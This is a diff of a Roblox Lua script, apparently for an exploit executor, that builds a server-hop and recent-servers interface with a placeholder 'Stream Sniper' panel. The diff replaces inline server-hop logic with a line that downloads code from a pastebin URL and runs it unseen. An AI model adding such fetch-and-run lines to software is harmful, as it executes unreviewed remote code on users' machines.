@@ -6,168 +6,163 @@ task.spawn(function()
     local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
     local Player = Players.LocalPlayer
-    local PlaceId, JobId = game.PlaceId, game.JobId
+    local PlaceId = game.PlaceId
+    local JobId = game.JobId
 
     local RootFolder = "ServerHop"
     local StorageFile = `{RootFolder}/{PlaceId}.json`
     local MaxTracked = 2
+
     if not isfolder(RootFolder) then makefolder(RootFolder) end
 
     local Tracked = {}
     if isfile(StorageFile) then
         local data = HttpService:JSONDecode(readfile(StorageFile))
-        if typeof(data)=="table" then Tracked = data end
+        if typeof(data) == "table" then
+            Tracked = data
+        end
     end
+
     if not table.find(Tracked, JobId) then
-        table.insert(Tracked,1,JobId)
-        if #Tracked>MaxTracked then table.remove(Tracked,#Tracked) end
-        writefile(StorageFile,HttpService:JSONEncode(Tracked))
+        table.insert(Tracked, 1, JobId)
+        if #Tracked > MaxTracked then table.remove(Tracked, #Tracked) end
+        writefile(StorageFile, HttpService:JSONEncode(Tracked))
     end
 
-    local gui = Instance.new("ScreenGui",Player:WaitForChild("PlayerGui",5) or game:GetService("CoreGui"))
-    gui.Name="ServerHopUI"
-    gui.ResetOnSpawn=false
-    gui.IgnoreGuiInset=true
+    local guiParent = Player:WaitForChild("PlayerGui", 5) or game:GetService("CoreGui")
+    local screenGui = Instance.new("ScreenGui", guiParent)
+    screenGui.Name = "ServerHopUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
 
-    local function mkBtn(txt,pos,cb)
-        local b=Instance.new("TextButton",gui)
-        b.Size=UDim2.new(0,150,0,40)
-        b.Position=pos
-        b.Text=txt
-        b.BackgroundColor3=Color3.fromRGB(40,40,40)
-        b.TextColor3=Color3.new(1,1,1)
-        b.Font=Enum.Font.GothamBold
-        b.TextSize=16
-        b.BorderSizePixel=0
-        b.AutoButtonColor=true
-        b.MouseButton1Click:Connect(cb)
-        return b
+    local function CreateMainButton(text, position, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, 150, 0, 40)
+        btn.Position = position
+        btn.Text = text
+        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 16
+        btn.BorderSizePixel = 0
+        btn.AutoButtonColor = true
+        btn.Parent = screenGui
+        btn.MouseButton1Click:Connect(callback)
+        return btn
     end
 
-    mkBtn("Rejoin Server",UDim2.new(0.5,-160,1,-200),function()
-        TeleportService:TeleportToPlaceInstance(PlaceId,JobId,Player)
+    CreateMainButton("Rejoin Server", UDim2.new(0.5, -160, 1, -170), function()
+        TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Player)
     end)
 
-    mkBtn("Server Hop",UDim2.new(0.5,10,1,-200),function()
-        loadstring([[
-            local HttpService=game:GetService("HttpService")
-            local TeleportService=game:GetService("TeleportService")
-            local cursor=""
-            local tried={}
-            local function fetch()
-                local url="https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"..(cursor~="" and"&cursor="..cursor or"")
-                local s,r=pcall(function()return game:HttpGet(url)end)
-                if s then
-                    local d=HttpService:JSONDecode(r)
-                    cursor=d.nextPageCursor or ""
-                    return d.data
-                end
-            end
-            while true do
-                local sv=fetch()
-                if not sv then break end
-                for _,s2 in ipairs(sv) do
-                    if s2.playing<s2.maxPlayers and s2.id~=game.JobId and not table.find(tried,s2.id) then
-                        table.insert(tried,s2.id)
-                        TeleportService:TeleportToPlaceInstance(game.PlaceId,s2.id,game.Players.LocalPlayer)
-                        return
-                    end
-                end
-                if cursor=="" then wait(1); tried={} end
-            end
-        ]])()
+    CreateMainButton("Server Hop", UDim2.new(0.5, 10, 1, -170), function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/7tSgB7Uk"))()
     end)
 
-    local toggle = Instance.new("TextButton",gui)
-    toggle.Size=UDim2.new(0,30,0,40)
-    toggle.Position=UDim2.new(1,-35,0.5,-100)
-    toggle.AnchorPoint=Vector2.new(0,0.5)
-    toggle.BackgroundColor3=Color3.fromRGB(50,50,50)
-    toggle.TextColor3=Color3.fromRGB(255,255,255)
-    toggle.Font=Enum.Font.GothamBold
-    toggle.TextSize=18
-    toggle.Text="➤"
-    toggle.ZIndex=10
+    local streamSniperMenu = Instance.new("Frame", screenGui)
+    streamSniperMenu.Size = UDim2.new(0, 400, 0, 260)
+    streamSniperMenu.Position = UDim2.new(0.5, -200, 0.5, -130)
+    streamSniperMenu.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+    streamSniperMenu.Visible = false
 
-    local panel = Instance.new("Frame",gui)
-    panel.Size=UDim2.new(0,300,0,260)
-    panel.Position=UDim2.new(1,0,0.5,-130)
-    panel.BackgroundColor3=Color3.fromRGB(25,25,25)
-    panel.BorderSizePixel=0
-    panel.Visible=false
-    panel.ZIndex=9
+    local header = Instance.new("TextLabel", streamSniperMenu)
+    header.Size = UDim2.new(1, 0, 0, 40)
+    header.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+    header.Text = "Stream Sniper"
+    header.Font = Enum.Font.GothamBold
+    header.TextSize = 20
+    header.TextColor3 = Color3.new(1, 1, 1)
 
-    local scroll = Instance.new("ScrollingFrame",panel)
-    scroll.Size=UDim2.new(1,0,1,0)
-    scroll.CanvasSize=UDim2.new(0,0,0,0)
-    scroll.ScrollBarThickness=4
-    scroll.BackgroundTransparency=1
+    local snipeOpen = false
+    local sidebarOpen = false
 
-    local activePanel = "none"
-    local function clearScroll()
-        for i,v in ipairs(scroll:GetChildren()) do if v:IsA("Frame") or v:IsA("TextLabel") or v:IsA("TextButton") then v:Destroy() end end
-    end
-    local function refreshHop()
-        clearScroll()
-        local y=0
-        for i,id in ipairs(Tracked) do
-            local f=Instance.new("Frame",scroll)
-            f.Size=UDim2.new(1,-10,0,50)
-            f.Position=UDim2.new(0,5,0,y)
-            f.BackgroundColor3=Color3.fromRGB(35,35,35)
-            f.BorderSizePixel=0
+    local toggleSnipeBtn = CreateMainButton("Stream Snipe", UDim2.new(0.5, -75, 1, -220), function()
+        snipeOpen = not snipeOpen
+        streamSniperMenu.Visible = snipeOpen
+        if snipeOpen then
+            sidebar.Position = UDim2.new(1, 0, 0.5, -80)
+            sidebarOpen = false
+        end
+    end)
 
-            local lbl=Instance.new("TextLabel",f)
-            lbl.Size=UDim2.new(1,-80,1,0)
-            lbl.Position=UDim2.new(0,5,0,0)
-            lbl.BackgroundTransparency=1
-            lbl.TextXAlignment=Enum.TextXAlignment.Left
-            lbl.Font=Enum.Font.Gotham
-            lbl.TextSize=14
-            lbl.Text=(id==JobId and"[Current] " or "").."Server ID: "..id
-            lbl.TextColor3=id==JobId and Color3.fromRGB(100,255,100) or Color3.new(1,1,1)
+    local toggleSidebarBtn = Instance.new("TextButton", screenGui)
+    toggleSidebarBtn.Text = "Recent Servers"
+    toggleSidebarBtn.Size = UDim2.new(0, 120, 0, 40)
+    toggleSidebarBtn.Position = UDim2.new(1, -130, 0.5, -120)
+    toggleSidebarBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    toggleSidebarBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    toggleSidebarBtn.Font = Enum.Font.GothamBold
+    toggleSidebarBtn.TextSize = 14
+    toggleSidebarBtn.ZIndex = 10
 
-            if id~=JobId then
-                local btn=Instance.new("TextButton",f)
-                btn.Size=UDim2.new(0,60,0,30)
-                btn.Position=UDim2.new(1,-65,0.5,-15)
-                btn.Text="Join"
-                btn.Font=Enum.Font.GothamBold
-                btn.TextSize=13
-                btn.BackgroundColor3=Color3.fromRGB(80,80,80)
-                btn.TextColor3=Color3.new(1,1,1)
-                btn.MouseButton1Click:Connect(function()
-                    TeleportService:TeleportToPlaceInstance(PlaceId,id,Player)
+    local sidebar = Instance.new("Frame", screenGui)
+    sidebar.Size = UDim2.new(0, 260, 0, 160)
+    sidebar.Position = UDim2.new(1, 0, 0.5, -80)
+    sidebar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    sidebar.BorderSizePixel = 0
+    sidebar.ZIndex = 9
+
+    local scroll = Instance.new("ScrollingFrame", sidebar)
+    scroll.Size = UDim2.new(1, 0, 1, 0)
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scroll.ScrollBarThickness = 4
+    scroll.BackgroundTransparency = 1
+    scroll.ZIndex = 9
+
+    local function refreshServerList()
+        scroll:ClearAllChildren()
+        local y = 0
+
+        for _, id in ipairs(Tracked) do
+            local row = Instance.new("Frame", scroll)
+            row.Size = UDim2.new(1, -10, 0, 40)
+            row.Position = UDim2.new(0, 5, 0, y)
+            row.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+            row.BorderSizePixel = 0
+            row.ZIndex = 9
+
+            local label = Instance.new("TextLabel", row)
+            label.Size = UDim2.new(1, -70, 1, 0)
+            label.Position = UDim2.new(0, 5, 0, 0)
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.BackgroundTransparency = 1
+            label.TextColor3 = id == JobId and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 255, 255)
+            label.Font = Enum.Font.Gotham
+            label.TextSize = 14
+            label.Text = (id == JobId and "[Current] " or "") .. "Server ID: " .. id
+            label.ZIndex = 9
+
+            if id ~= JobId then
+                local join = Instance.new("TextButton", row)
+                join.Size = UDim2.new(0, 50, 0, 26)
+                join.Position = UDim2.new(1, -55, 0.5, -13)
+                join.Text = "Join"
+                join.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+                join.TextColor3 = Color3.fromRGB(255, 255, 255)
+                join.Font = Enum.Font.GothamBold
+                join.TextSize = 13
+                join.ZIndex = 9
+
+                join.MouseButton1Click:Connect(function()
+                    TeleportService:TeleportToPlaceInstance(PlaceId, id, Player)
                 end)
             end
-            y+=55
+
+            y += 45
         end
-        scroll.CanvasSize=UDim2.new(0,0,0,y+5)
+
+        scroll.CanvasSize = UDim2.new(0, 0, 0, y + 5)
     end
 
-    local function refreshSnipe()
-        clearScroll()
-        -- build all Stream Snipe GUI elements here (TextBoxes, labels, Start button, etc.)
-        -- same as your old UI but parented to 'scroll' and sized/positioned appropriately
-        -- implement button logic to snipe player
-    end
-
-    toggle.MouseButton1Click:Connect(function()
-        panel.Visible=not panel.Visible
-        toggle.Text=panel.Visible and"⬅" or"➤"
-        if panel.Visible then
-            if activePanel=="hop" then refreshHop()
-            elseif activePanel=="snipe" then refreshSnipe()
-            else activePanel="hop"; refreshHop() end
+    toggleSidebarBtn.MouseButton1Click:Connect(function()
+        sidebarOpen = not sidebarOpen
+        local goal = sidebarOpen and UDim2.new(1, -265, 0.5, -80) or UDim2.new(1, 0, 0.5, -80)
+        TweenService:Create(sidebar, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = goal }):Play()
+        if sidebarOpen then
+            streamSniperMenu.Visible = false
+            snipeOpen = false
         end
-        TweenService:Create(panel,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=panel.Visible and UDim2.new(1,-300,0.5,-130) or UDim2.new(1,0,0.5,-130)}):Play()
     end)
 
-    -- Optional: dedicated button to open Snipe panel:
-    mkBtn("Stream Snipe",UDim2.new(0.5,-75,1,-250),function()
-        if activePanel~="snipe" then activePanel="snipe" end
-        panel.Visible=true; toggle.Text="⬅"
-        refreshSnipe()
-        TweenService:Create(panel,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(1,-300,0.5,-130)}):Play()
-    end)
+    refreshServerList()
 end)
